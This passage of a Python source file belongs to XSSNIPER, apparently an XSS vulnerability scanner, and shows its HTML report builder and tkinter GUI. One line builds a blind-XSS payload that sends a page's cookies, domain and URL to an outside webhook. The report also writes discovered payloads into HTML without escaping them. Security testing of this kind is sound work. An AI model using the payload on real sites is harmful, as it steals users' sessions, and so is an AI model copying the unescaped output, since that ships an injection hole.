                .alert-medium {{ color: #000; background-color: #FFD2A8; border: 1px solid #FF8000; }}
                .alert-info {{ color: #E6E6E6; background-color: #012B5C; border: 1px solid #0000FF; }}
                pre {{ white-space: pre-wrap; word-wrap: break-word; background-color: #222; padding: 10px; border-radius: 3px; font-family: monospace; color: #FFFF00; }}
                a {{ color: #3498db; }}
                .metadata table {{ width: 100%; border-collapse: collapse; }}
                .metadata td {{ padding: 8px; border: 1px solid #333; }}
                .payloads {{ margin-top: 10px; }}
                .payloads h5 {{ margin: 5px 0; color: #ffd166; }}
                .confidence {{ display: inline-block; padding: 2px 6px; border-radius: 3px; font-weight: bold; }}
                .confidence-high {{ background-color: #ff4444; }}
                .confidence-medium {{ background-color: #ffaa00; }}
                .confidence-low {{ background-color: #4444ff; }}
            </style>
        </head>
        <body>
            <h1>XSSNIPER Security Assessment Report</h1>
            <div class="metadata">
                <h3>Scan Details</h3>
                <table>
                    <tr><td><strong>Target Host:</strong></td><td>{data['target']}</td></tr>
                    <tr><td><strong>Scan Date:</strong></td><td>{data['scan_date']}</td></tr>
                    <tr><td><strong>Total Scanned URLs:</strong></td><td>{data['urls_scanned']}</td></tr>
                    <tr><td><strong>Total Unique Vulnerabilities:</strong></td><td>{len(data['findings'])}</td></tr>
                </table>
            </div>
            <!-- 🔥 ATTACK CHAIN SUMMARY (ADDED) -->
            <h2>Attack Chain Summary</h2>
            <div class="alert alert-info">
                <ul>
                    <li><b>IDOR → Data Leak:</b> Unauthorized object access indicators detected.</li>
                    <li><b>CSRF → Privilege Escalation:</b> State-changing requests may lack CSRF protection.</li>
                    <li><b>Logic Bug → Payment Bypass:</b> Client-controlled pricing or plan manipulation observed.</li>
                    <li><b>XSS → Account Takeover Signal:</b> XSS vectors found in sensitive or authenticated contexts.</li>
                </ul>
                <p><i>Note:</i> These are <b>attack-chain indicators</b>. Manual validation required.</p>
            </div>

            <h2>Vulnerability Findings</h2>
        """
        body = []

        for i, grouped_finding in enumerate(data['findings'], 1):
            fnd = grouped_finding["finding"]  # Base finding
            payloads = grouped_finding["payloads"]  # All payloads for this vulnerability
            confidence = grouped_finding["confidence"]
            risk_level, risk_color, risk_name = get_risk_info(fnd.get('type',''))
            
            # Detailed description based on finding type
            if "DOM XSS" in fnd.get('type',''):
                description = "The application appears vulnerable to DOM-based Cross-Site Scripting (XSS), where the attack payload is executed as a result of client-side code dynamically writing user-controllable data to the Document Object Model (DOM)."
                solution = "Inputs should be validated and sanitized before being written to the DOM. Review all JavaScript code that uses user-controlled data to modify the DOM, especially when using methods like `innerHTML`, `document.write`, or equivalent sinking functions."
            elif "Reflected" in fnd.get('type',''):
                description = "A reflected Cross-Site Scripting (XSS) vulnerability was found. The application returns the user-supplied input in the HTTP response without proper output encoding, allowing an attacker to inject and execute arbitrary HTML/JavaScript code in the user’s browser."
                solution = "Implement context-aware output encoding across the entire application. All user input should be encoded specifically for the HTML context where it is being placed (e.g., HTML entity encoding for body content, JavaScript encoding for script blocks, etc.)."
            elif "Stored" in fnd.get('type',''):
                description = "A mechanism to store a Cross-Site Scripting (XSS) payload was successfully triggered, indicating a potential Stored XSS vulnerability. This is often the most critical form of XSS as the malicious code is served to other users without requiring direct interaction."
                solution = "Ensure all data is validated and sanitized before being persistently stored in the database. When retrieving data for display, apply context-aware output encoding to prevent its interpretation as executable code."
            elif "SSTI" in fnd.get('type',''):
                 description = "Potentially vulnerable to Server-Side Template Injection (SSTI). The payload `{{7*7}}` (or similar) was reflected in the response output as `49` (or the equivalent calculation), suggesting the server processes user input as a template expression."
                 solution = "If user input must be included in a template, it should be passed as data to the template and not as part of the template code itself. If this is not possible, implement a strict sandbox to limit the available functions and properties in the template context."
            elif "Prototype Pollution" in fnd.get('type',''):
                 description = "Prototype Pollution (PP) vulnerability detected, where an attacker can modify the prototype of base JavaScript objects. This can lead to issues like Denial of Service, or remote code execution if coupled with other vulnerabilities such as property injection."
                 solution = "Avoid merging two objects recursively without checking for `__proto__` or `constructor` properties. Implement a strict check to prevent these properties from being modified through user input keys."
            elif "JS Sink" in fnd.get('type',''):
                 description = "JavaScript sink vulnerability detected. The application uses potentially dangerous JavaScript functions that can execute user-controlled input, leading to DOM-based XSS."
                 solution = "Avoid using dangerous JavaScript sinks with user input. If their use is unavoidable, implement strict input validation and context-aware output encoding. Consider using safer alternatives when possible."
            elif "ATO Chain" in fnd.get('type',''):
                 description = "Potential Account Takeover (ATO) vulnerability detected. The application reveals sensitive information that could be exploited in account takeover attacks."
                 solution = "Implement consistent responses for all authentication-related operations. Avoid revealing whether user accounts exist. Use rate limiting and CAPTCHA for authentication endpoints."
            elif "Nuclei" in fnd.get('type',''):
                 description = "Extended XSS finding detected by Nuclei scanner. This represents additional XSS vulnerabilities beyond what the core XSSNIPER scanner identified."
                 solution = "Address all XSS vulnerabilities by implementing proper input validation, output encoding, and Content Security Policy (CSP) headers."
            else: # Blind XSS/Info
                 description = "An out-of-band XSS (Blind XSS) payload was submitted to the application. If this payload executes later on a backend system (e.g., in an administrative dashboard), a callback will be sent to the configured OAST domain, indicating a successful Blind XSS finding. A direct execution was also noted."
                 solution = "Follow all XSS prevention steps (input validation, output encoding) for all application inputs, as input may be rendered on a different, un-tested system (like a CMS or admin panel)."

            risk_map = {"High": "alert-high", "Medium": "alert-medium", "Informational": "alert-info"}
            alert_class = risk_map.get(risk_level, "alert-info")
            
            # Confidence badge
            conf_badge = f"<span class='confidence confidence-{confidence.lower()}'>{confidence} Confidence</span>"

            # Format payloads list
            payload_html = "<div class='payloads'><h5>All payloads discovered for this vulnerability:</h5>"
            for p in payloads:
                payload_html += f"<pre>{p}</pre>"
            payload_html += "</div>"
            
            # PoC URL with clickable link
            poc_data = "&".join([f"{k}={v}" for k, v in fnd.get("poc_data", {}).items()])
            poc_data_part = f"?{poc_data}" if poc_data else ""
            poc_url = f"{fnd.get('poc_url', fnd.get('url', ''))}{poc_data_part}"
            poc_link = f"<p><strong>PoC URL:</strong> <a href='{poc_url}' target='_blank'>{poc_url}</a></p>"

            # Format the individual finding
            finding_html = f"""
            <div class="alert {alert_class}">
                <h3>{i}. {risk_name} {conf_badge}</h3>
                <p><strong>URL:</strong> <a href="{fnd.get('url','')}" target="_blank">{fnd.get('url','')}</a></p>
                <p><strong>Vulnerability Type:</strong> {fnd.get('type','N/A')}</p>
                <p><strong>Parameter/Context:</strong> {fnd.get('param','N/A')} ({fnd.get('method','')})</p>
                {poc_link}
                
                <h4>Description</h4>
                <p>{description}</p>
                
                <h4>Discovered Payloads</h4>
                {payload_html}
                
                <h4>Solution/Mitigation</h4>
                <p>{solution}</p>
            </div>
            """
            body.append(finding_html)

        html_end = f"</body></html>"
        return html_start + "\n".join(body) + html_end

# ---------------- GUI (Burp-style curved tabs) ----------------
class AXST_GUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(" XSSNIPER ")
        self.geometry("1200x750")
        self.configure(bg="#0b0b0b")

        self.scanner = AdvancedXSSTester(self.append_log, self.add_vulnerability, max_workers=MAX_WORKERS)
        self.scan_thread = None
        self._vuln_details = [] # Initializing for the GUI

        self._build_ui()

    def _build_ui(self):
        # heavy Burp-like header with orange accent
        header = tk.Frame(self, bg="#0b0b0b")
        header.pack(fill='x', pady=(6,4))
        accent = tk.Frame(header, bg="#F27024", width=8, height=40)
        accent.pack(side='left', padx=(8,8), pady=2)
        title = tk.Label(header, text="XSSNIPER", bg="#0b0b0b", fg="#EDEDED", font=("Segoe UI",14,"bold"))
        title.pack(side='left')

        # Tabbar (curved-style using buttons)
        tabbar = tk.Frame(self, bg="#0b0b0b")
        tabbar.pack(fill='x', padx=12, pady=(8,0))
        self.active_tab = tk.StringVar(value="Scanner")
        for t in ("Scanner","Vulnerabilities","Options","Report","Auth"):
            b = tk.Radiobutton(tabbar, text=t, value=t, variable=self.active_tab, indicatoron=0,
                               width=15, pady=6,
                               command=self._render_tab,
                               bg="#121212", fg="#E6E6E6", selectcolor="#F27024",
                               font=("Segoe UI",10,"bold"), bd=0, relief='flat', activebackground="#1E1E1E")
            b.pack(side='left', padx=6)

        # main content area
        self.container = tk.Frame(self, bg="#0b0b0b")
        self.container.pack(fill='both', expand=True, padx=12, pady=8)

        # create frames for tabs
        self._frame_scanner()
        self._frame_vulns()
        self._frame_options()
        self._frame_report()
        self._frame_auth()

        self._render_tab()

        # status
        self.status = tk.Label(self, text="Ready", bg="#070707", fg="#9ea7b8", anchor='w')
        self.status.pack(fill='x', side='bottom')

    # ---- Frames setup ----
    def _frame_scanner(self):
        f = tk.Frame(self.container, bg="#0b0b0b")
        self.frame_scanner = f

        top = tk.Frame(f, bg="#0b0b0b")
        top.pack(fill='x', pady=(6,4))
        tk.Label(top, text="Target URL:", bg="#0b0b0b", fg="#d0d0d0").pack(side='left', padx=(6,6))
        self.url_entry = tk.Entry(top, width=60, bg="#1c1c1c", fg="#e6e6e6", insertbackground="#e6e6e6")
        self.url_entry.pack(side='left', padx=(0,8))
        self.url_entry.insert(0, "http://testphp.vulnweb.com/listproducts.php?cat=1")

        btn_frame = tk.Frame(top, bg="#0b0b0b")
        btn_frame.pack(side='left')
        self.start_btn = tk.Button(btn_frame, text="START SCAN", command=self.start_scan, bg="#F27024", fg="#0b0b0b", font=("Segoe UI",10,"bold"))
        self.start_btn.pack(side='left', padx=4)
        self.stop_btn = tk.Button(btn_frame, text="STOP", command=self.stop_scan, bg="#333", fg="#fff", state='disabled')
        self.stop_btn.pack(side='left', padx=4)
        self.save_btn = tk.Button(btn_frame, text="Save Report", command=self.save_report_dialog, bg="#2d7bd6", fg="#fff")
        self.save_btn.pack(side='left', padx=4)

        # split left log / right quick summary
        body = tk.Frame(f, bg="#0b0b0b")
        body.pack(fill='both', expand=True, pady=(8,6))

        left = tk.Frame(body, bg="#0b0b0b")
        left.pack(side='left', fill='both', expand=True)

        lbl_log = tk.Label(left, text="Live Log:", bg="#0b0b0b", fg="#d0d0d0", anchor='w')
        lbl_log.pack(fill='x', padx=6)
        self.log_area = scrolledtext.ScrolledText(left, wrap='word', bg="#070707", fg="#9efc9e", insertbackground="#9efc9e", font=("Courier New",9))
        self.log_area.pack(fill='both', expand=True, padx=6, pady=(4,6))

        right = tk.Frame(body, bg="#0b0b0b", width=320)
        right.pack(side='right', fill='y', padx=(8,0))
        tk.Label(right, text="Quick Summary", bg="#0b0b0b", fg="#ffd166", font=("Segoe UI",11,"bold")).pack(anchor='nw', pady=(2,6))
        self.summary_area = tk.Text(right, height=10, bg="#101010", fg="#fff", state='disabled')
        self.summary_area.pack(fill='both', expand=False, padx=6, pady=(0,6))

    def _frame_vulns(self):
        f = tk.Frame(self.container, bg="#0b0b0b")
        self.frame_vulns = f
        title = tk.Label(f, text="Vulnerabilities", bg="#0b0b0b", fg="#ffd166", font=("Segoe UI",12,"bold"))
        title.pack(anchor='nw', pady=(6,4), padx=6)

        self.vuln_list = tk.Listbox(f, bg="#0b0b0b", fg="#ffd166", selectbackground="#333", activestyle='none', font=("Segoe UI",10))
        self.vuln_list.pack(fill='both', expand=True, padx=8, pady=(0,6))
        btns = tk.Frame(f, bg="#0b0b0b")
        btns.pack(fill='x', padx=8, pady=(0,6))
        tk.Button(btns, text="Show Detail", command=self.show_selected_detail, bg="#6c5ce7", fg="#fff").pack(side='left', padx=6)
        tk.Button(btns, text="Copy Payload", command=self.copy_payload, bg="#00b894", fg="#000").pack(side='left', padx=6)
        tk.Button(btns, text="Clear", command=self.clear_vulns, bg="#666", fg="#fff").pack(side='left', padx=6)

    def _frame_options(self):
        f = tk.Frame(self.container, bg="#0b0b0b")
        self.frame_options = f
        tk.Label(f, text="Options", bg="#0b0b0b", fg="#E6E6E6", font=("Segoe UI",12,"bold")).pack(anchor='nw', padx=8, pady=(6,6))
        optf = tk.Frame(f, bg="#0b0b0b")
        optf.pack(fill='x', padx=8)
        
        # Workers
        tk.Label(optf, text="Workers (max 8):", bg="#0b0b0b", fg="#bbb").grid(row=0, column=0, sticky='w', pady=4)
        self.workers_spin = tk.Spinbox(optf, from_=1, to=8, width=4, textvariable=tk.StringVar(value=str(MAX_WORKERS)))
        self.workers_spin.grid(row=0, column=1, sticky='w', padx=6)
        
        # Crawl Depth
        tk.Label(optf, text="Crawl depth (max 5):", bg="#0b0b0b", fg="#bbb").grid(row=1, column=0, sticky='w', pady=4)
        self.depth_spin = tk.Spinbox(optf, from_=0, to=5, width=4, textvariable=tk.StringVar(value=str(MAX_CRAWL_DEPTH)))
        self.depth_spin.grid(row=1, column=1, sticky='w', padx=6)
        
        # OOB Domain
        tk.Label(optf, text="OOB Domain (Blind):", bg="#0b0b0b", fg="#bbb").grid(row=2, column=0, sticky='w', pady=4)
        self.oob_entry = tk.Entry(optf, width=40, bg="#1c1c1c", fg="#e6e6e6")
        self.oob_entry.grid(row=2, column=1, columnspan=2, sticky='w', padx=6)
        self.oob_entry.insert(0, BLIND_XSS_WEBHOOK_URL)
        
        tk.Button(f, text="Apply & Restart Scanner Settings", command=self.apply_options, bg="#F27024", fg="#000").pack(padx=8, pady=8, anchor='w')

    def _frame_report(self):
        f = tk.Frame(self.container, bg="#0b0b0b")
        self.frame_report = f
        tk.Label(f, text="Report Generator", bg="#0b0b0b", fg="#E6E6E6", font=("Segoe UI",12,"bold")).pack(anchor='nw', padx=8, pady=6)
        tk.Button(f, text="Save last report (JSON+HTML+CSV)", command=self.save_report_dialog, bg="#3498db", fg="#000").pack(padx=8, pady=6, anchor='nw')
        
        tk.Label(f, text="HTML Report Preview:", bg="#0b0b0b", fg="#d0d0d0", anchor='w').pack(fill='x', padx=8)

        self.report_preview = scrolledtext.ScrolledText(f, bg="#070707", fg="#9efc9e", height=20, font=("Courier New",9))
        self.report_preview.pack(fill='both', expand=True, padx=8, pady=8)

    def _frame_auth(self):
        f = tk.Frame(self.container, bg="#0b0b0b")
        self.frame_auth = f
        tk.Label(f, text="Authentication Settings", bg="#0b0b0b", fg="#E6E6E6", font=("Segoe UI",12,"bold")).pack(anchor='nw', padx=8, pady=(6,6))
        
        # Auth type selection
        auth_frame = tk.Frame(f, bg="#0b0b0b")
        auth_frame.pack(fill='x', padx=8, pady=4)
        tk.Label(auth_frame, text="Auth Type:", bg="#0b0b0b", fg="#bbb").pack(side='left')
        self.auth_type_var = tk.StringVar(value="None")
        auth_types = ["None", "Form-based", "Header-based", "Token-based"]
        tk.OptionMenu(auth_frame, self.auth_type_var, *auth_types, command=self._on_auth_type_change).pack(side='left', padx=6)
        
        # Form-based auth
        self.form_auth_frame = tk.Frame(f, bg="#0b0b0b")
        self.form_auth_frame.pack(fill='x', padx=8, pady=4)
        
        tk.Label(self.form_auth_frame, text="Login URL:", bg="#0b0b0b", fg="#bbb").grid(row=0, column=0, sticky='w', pady=2)
        self.login_url_entry = tk.Entry(self.form_auth_frame, width=50, bg="#1c1c1c", fg="#e6e6e6")
        self.login_url_entry.grid(row=0, column=1, padx=6, pady=2)
        
        tk.Label(self.form_auth_frame, text="Username Field:", bg="#0b0b0b", fg="#bbb").grid(row=1, column=0, sticky='w', pady=2)
        self.username_field_entry = tk.Entry(self.form_auth_frame, width=30, bg="#1c1c1c", fg="#e6e6e6")
        self.username_field_entry.grid(row=1, column=1, sticky='w', padx=6, pady=2)
        
        tk.Label(self.form_auth_frame, text="Password Field:", bg="#0b0b0b", fg="#bbb").grid(row=2, column=0, sticky='w', pady=2)
        self.password_field_entry = tk.Entry(self.form_auth_frame, width=30, bg="#1c1c1c", fg="#e6e6e6")
        self.password_field_entry.grid(row=2, column=1, sticky='w', padx=6, pady=2)
        
        tk.Label(self.form_auth_frame, text="Username:", bg="#0b0b0b", fg="#bbb").grid(row=3, column=0, sticky='w', pady=2)
        self.username_entry = tk.Entry(self.form_auth_frame, width=30, bg="#1c1c1c", fg="#e6e6e6")
        self.username_entry.grid(row=3, column=1, sticky='w', padx=6, pady=2)
        
        tk.Label(self.form_auth_frame, text="Password:", bg="#0b0b0b", fg="#bbb").grid(row=4, column=0, sticky='w', pady=2)
        self.password_entry = tk.Entry(self.form_auth_frame, width=30, bg="#1c1c1c", fg="#e6e6e6", show="*")
        self.password_entry.grid(row=4, column=1, sticky='w', padx=6, pady=2)
        
        # Header-based auth
        self.header_auth_frame = tk.Frame(f, bg="#0b0b0b")
        self.header_auth_frame.pack(fill='x', padx=8, pady=4)
        
        tk.Label(self.header_auth_frame, text="Header Name:", bg="#0b0b0b", fg="#bbb").grid(row=0, column=0, sticky='w', pady=2)
        self.header_name_entry = tk.Entry(self.header_auth_frame, width=30, bg="#1c1c1c", fg="#e6e6e6")
        self.header_name_entry.grid(row=0, column=1, sticky='w', padx=6, pady=2)
        
        tk.Label(self.header_auth_frame, text="Header Value:", bg="#0b0b0b", fg="#bbb").grid(row=1, column=0, sticky='w', pady=2)
        self.header_value_entry = tk.Entry(self.header_auth_frame, width=50, bg="#1c1c1c", fg="#e6e6e6")
        self.header_value_entry.grid(row=1, column=1, padx=6, pady=2)
        
        # Token-based auth
        self.token_auth_frame = tk.Frame(f, bg="#0b0b0b")
        self.token_auth_frame.pack(fill='x', padx=8, pady=4)
        
        tk.Label(self.token_auth_frame, text="Token URL:", bg="#0b0b0b", fg="#bbb").grid(row=0, column=0, sticky='w', pady=2)
        self.token_url_entry = tk.Entry(self.token_auth_frame, width=50, bg="#1c1c1c", fg="#e6e6e6")
        self.token_url_entry.grid(row=0, column=1, padx=6, pady=2)
        
        tk.Label(self.token_auth_frame, text="Token Field:", bg="#0b0b0b", fg="#bbb").grid(row=1, column=0, sticky='w', pady=2)
        self.token_field_entry = tk.Entry(self.token_auth_frame, width=30, bg="#1c1c1c", fg="#e6e6e6")
        self.token_field_entry.grid(row=1, column=1, sticky='w', padx=6, pady=2)
        
        tk.Label(self.token_auth_frame, text="Token Location:", bg="#0b0b0b", fg="#bbb").grid(row=2, column=0, sticky='w', pady=2)
        self.token_location_var = tk.StringVar(value="header")
        tk.Radiobutton(self.token_auth_frame, text="Header", variable=self.token_location_var, value="header", bg="#0b0b0b", fg="#bbb", selectcolor="#0b0b0b").grid(row=2, column=1, sticky='w', padx=6)
        tk.Radiobutton(self.token_auth_frame, text="Cookie", variable=self.token_location_var, value="cookie", bg="#0b0b0b", fg="#bbb", selectcolor="#0b0b0b").grid(row=2, column=2, sticky='w')
        
        # Apply button
        tk.Button(f, text="Apply Authentication", command=self.apply_auth, bg="#F27024", fg="#000").pack(padx=8, pady=8, anchor='w')
        
        # Initially hide all auth frames
        self._on_auth_type_change("None")

    def _on_auth_type_change(self, value):
        # Hide all frames
        self.form_auth_frame.pack_forget()
        self.header_auth_frame.pack_forget()
        self.token_auth_frame.pack_forget()
        
        # Show selected frame
        if value == "Form-based":
            self.form_auth_frame.pack(fill='x', padx=8, pady=4)
        elif value == "Header-based":
            self.header_auth_frame.pack(fill='x', padx=8, pady=4)
        elif value == "Token-based":
            self.token_auth_frame.pack(fill='x', padx=8, pady=4)

    def _render_tab(self):
        for widget in self.container.winfo_children():
            widget.pack_forget()
        sel = self.active_tab.get()
        if sel == "Scanner":
            self.frame_scanner.pack(fill='both', expand=True)
        elif sel == "Vulnerabilities":
            self.frame_vulns.pack(fill='both', expand=True)
        elif sel == "Options":
            self.frame_options.pack(fill='both', expand=True)
        elif sel == "Report":
            # Repopulate preview
            try:
                data = {
                    "title":"Last scan (preview)",
                    "target": self.scanner.base_domain or "N/A",
                    "scan_date": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()),
                    "urls_scanned": len(self.scanner.scanned_urls),
                    "findings": self.scanner.findings
                }
                preview = self.scanner._generate_html_report(data)
                self.report_preview.configure(state='normal')
                self.report_preview.delete('1.0', tk.END)
                self.report_preview.insert(tk.END, preview)
                self.report_preview.configure(state='disabled')
            except Exception as e:
                self.report_preview.configure(state='normal')
                self.report_preview.delete('1.0', tk.END)
                self.report_preview.insert(tk.END, f"Error generating preview: {e}")
                self.report_preview.configure(state='disabled')
            
            self.frame_report.pack(fill='both', expand=True)
        elif sel == "Auth":
            self.frame_auth.pack(fill='both', expand=True)

    # ---- GUI Helpers ----
    def append_log(self, text):
        def _append():
            self.log_area.insert(tk.END, text)
            self.log_area.see(tk.END)

        # update quick summary
            findings_count = len(self.scanner.findings)

            if findings_count > 0:
                attack_chain_status = " Potentially Vulnerable"
            else:
                attack_chain_status = " Not Confirmed"

            s = (
                f"URLs scanned: {len(self.scanner.scanned_urls)}\n"
                f"Findings: {findings_count}\n\n"
                f"Attack Chain Summary:\n"
                f"• IDOR → Data Leak\n"
                f"• CSRF → Privilege Escalation\n"
                f"• Logic Bug → Payment Bypass\n"
                f"• XSS → Account Takeover Signal\n\n"
                f"Attack Chain Status:\n"
                f"{attack_chain_status}"
            )

            self.summary_area.configure(state='normal')
            self.summary_area.delete('1.0', tk.END)
            self.summary_area.insert(tk.END, s)
            self.summary_area.configure(state='disabled')

        self.after(0, _append)



    def add_vulnerability(self, grouped_finding):
        def _add():
            fnd = grouped_finding["finding"]  # Base finding details
            payloads = grouped_finding["payloads"]  # All payloads
            confidence = grouped_finding["confidence"]
            typ = fnd.get('type', 'VULN')
            url = fnd.get('url','')[:60].replace('\n', ' ')
            label = f"[{confidence}] {typ} — {url}... ({len(payloads)} payloads)"
            self.vuln_list.insert(tk.END, label)
            self._vuln_details.append(grouped_finding)
            self.status.config(text=f"Findings: {len(self._vuln_details)}")
        self.after(0, _add)

    def show_selected_detail(self):
        sel = self.vuln_list.curselection()
        if not sel:
            messagebox.showinfo("Info","Select a vulnerability in the list on the left.")
            return
        idx = sel[0]
        # Check if the list of details is consistent with the listbox
        if len(self._vuln_details) <= idx:
            messagebox.showerror("Error", "Internal list index out of bounds. Please clear vulnerabilities and retry scan.")
            return

        grouped_finding = self._vuln_details[idx]
        # Format the grouped finding for display
        formatted = {
            "base_finding": grouped_finding["finding"],
            "all_payloads": grouped_finding["payloads"],
            "confidence": grouped_finding["confidence"]
        }
        detail = json.dumps(formatted, indent=2)
        win = tk.Toplevel(self)
        win.title("Vulnerability Detail")
        win.geometry("900x500")
        win.configure(bg="#0b0b0b")
        ta = scrolledtext.ScrolledText(win, bg="#0b0b0b", fg="#ffd166", insertbackground="#ffd166")
        ta.pack(fill='both', expand=True)
        ta.insert(tk.END, detail)
        ta.configure(state='disabled')

    def copy_payload(self):
        sel = self.vuln_list.curselection()
        if not sel:
            messagebox.showinfo("Info","Select a vulnerability to copy payload.")
            return
        idx = sel[0]
        grouped_finding = self._vuln_details[idx]
        # Copy all payloads, separated by newlines
        payloads = grouped_finding["payloads"]
        payload_text = "\n".join(payloads)
        self.clipboard_clear()
        self.clipboard_append(payload_text)
        self.status.config(text=f"Copied {len(payloads)} payloads to clipboard")

    def clear_vulns(self):
        if messagebox.askyesno("Confirm","Clear all recorded vulnerabilities?"):
            self.vuln_list.delete(0, tk.END)
            self._vuln_details = []
            self.status.config(text="Cleared vulnerabilities")

    # ---- Controls ----
    def apply_options(self):
        try:
            w = int(self.workers_spin.get())
            d = int(self.depth_spin.get())
            
            # Apply to scanner instance
            self.scanner.max_workers = max(1, min(8, w))
            
            # Update global for crawling (used by logic inside scanner)
            global MAX_CRAWL_DEPTH
            MAX_CRAWL_DEPTH = max(0, min(5, d))
            
            # update oob domain
            global BLIND_XSS_WEBHOOK_URL
            BLIND_XSS_WEBHOOK_URL = self.oob_entry.get().strip() or BLIND_XSS_WEBHOOK_URL
            
            # Since payloads rely on the global variable, we need to regenerate the payload list
            global BLIND_XSS_PAYLOADS
            BLIND_XSS_PAYLOADS[0] = ("'\"/><script>"
                                    "var i=new Image();i.src='" + BLIND_XSS_WEBHOOK_URL +
                                    "?d='+encodeURIComponent(document.domain)+'&u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie);"
                                    "</script>")
            
            self.append_log("[INFO] Options applied. New workers: {}, Depth: {}, OOB domain updated. Payloads rebuilt.".format(self.scanner.max_workers, MAX_CRAWL_DEPTH))
        except Exception as e:
            messagebox.showerror("Error","Invalid options: " + str(e))

    def apply_auth(self):
        auth_type = self.auth_type_var.get()
        if auth_type == "None":
            self.scanner.auth_enabled = False
            self.append_log("[AUTH] Authentication disabled")
        elif auth_type == "Form-based":
            self.scanner.set_auth(
                'form',
                login_url=self.login_url_entry.get(),
                username_field=self.username_field_entry.get(),
                password_field=self.password_field_entry.get(),
                username=self.username_entry.get(),
                password=self.password_entry.get()
            )
            self.append_log("[AUTH] Form-based authentication configured")
        elif auth_type == "Header-based":
            self.scanner.set_auth(
                'header',
                header_name=self.header_name_entry.get(),
                header_value=self.header_value_entry.get()
            )
            self.append_log("[AUTH] Header-based authentication configured")
        elif auth_type == "Token-based":
            self.scanner.set_auth(
                'token',
                token_url=self.token_url_entry.get(),
                token_field=self.token_field_entry.get(),
                token_location=self.token_location_var.get()
            )
            self.append_log("[AUTH] Token-based authentication configured")
        else:
            self.append_log("[AUTH] No authentication method selected")

    def start_scan(self):
        if self.scanner.is_running:
            messagebox.showinfo("Info","Scan already running.")
            return
        url = self.url_entry.get().strip()
        if not (url.startswith('http://') or url.startswith('https://')):
            messagebox.showerror("Error","Enter a target URL starting with http:// or https://")
            return
            
        # Clear previous run data
        self.log_area.delete('1.0', tk.END)
        self.vuln_list.delete(0, tk.END)
        self._vuln_details = []
        
        # Apply current settings before scan starts
        self.apply_options()
        self.apply_auth()

        # start thread
        self.scan_thread = threading.Thread(target=self._run_scan_thread, args=(url,), daemon=True)
        self.scan_thread.start()
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        self.status.config(text="Scan running...")

    def _run_scan_thread(self, url):
        try:
            self.scanner.automate_xss_scan(url)
        except Exception as e:
            self.append_log(f"\n[CRITICAL ERR] Scan thread crashed: {e}")
        finally:
            def _finish():
                self.start_btn.config(state='normal')
                self.stop_btn.config(state='disabled')
                self.status.config(text=f"Scan finished. Findings: {len(self._vuln_details)}")
            self.after(0, _finish)

    def stop_scan(self):
        if not self.scanner.is_running:
            return
        self.scanner.is_running = False
        self.status.config(text="Stopping scan...")
        self.append_log("[INFO] Scan stop requested. Waiting for threads to finish...")

    def save_report_dialog(self):
        if not self.scanner.scanned_urls:
            if not messagebox.askyesno("No Scan Data","No URLs have been scanned. Would you like to save an empty/partial diagnostic report?"):
                return
        
        # Determine the default filename base
        default_base = f"XSSNIPER_{self.scanner.base_domain.replace(':','_')}" if self.scanner.base_domain else f"XSSNIPER_report"
        
        # Using a single save dialog to get the full path without extension
        fn = filedialog.asksaveasfilename(
            defaultextension="", # We will add extensions later
            filetypes=[("Report Base Name","*"), ("JSON","*.json"), ("HTML","*.html"), ("CSV","*.csv")], 
            title="Save report files (JSON, HTML, and CSV will be created based on this name)",
            initialfile=default_base
        )
        
        if not fn:
            return
        
        # Remove any lingering extension to get the true base for both files
        base = os.path.splitext(fn)[0] 
        self.scanner.export_report(filename_base=base)
        
        messagebox.showinfo("Saved","Report export successful. Check console log for specific file paths (.json, .html, and .csv).")

# ---------------- RUN ----------------
if __name__ == "__main__":
    app = AXST_GUI()
    app.mainloop()
